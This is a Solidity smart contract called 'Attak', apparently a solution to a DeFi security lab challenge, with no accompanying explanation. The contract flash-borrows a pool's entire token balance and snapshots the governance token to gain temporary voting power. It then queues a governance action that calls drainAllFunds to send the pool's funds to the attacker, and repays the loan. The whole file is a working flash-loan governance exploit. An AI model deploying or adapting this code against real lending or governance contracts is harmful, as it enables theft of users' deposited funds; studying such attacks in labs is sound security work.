pragma solidity 0.8.17;

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract Attak {
    I_pool pool;
    I_gov governance;
    IERC20 token;
    address own;
    uint256 public queueId;
    bool firstfl = true;

    constructor(address tkn, address pol, address gvrn) {
        pool = I_pool(pol);
        governance = I_gov(gvrn);
        token = IERC20(tkn);
        own = msg.sender;
    }

    function doFL() external {
        pool.flashLoan(token.balanceOf(address(pool)));
    }

    function receiveTokens(address tknz, uint256 borrowAmount) external {
        Idiocan(address(token)).snapshot();
        queueId =
            governance.queueAction(address(pool), abi.encodeWithSignature("drainAllFunds(address)", address(own)), 0);
        token.transfer(address(pool), borrowAmount);
    }
}

interface I_pool {
    function flashLoan(uint256 borrowAmount) external;
    function drainAllFunds(address receiver) external;
}

interface I_gov {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

interface Idiocan {
    function snapshot() external returns (uint256);
}
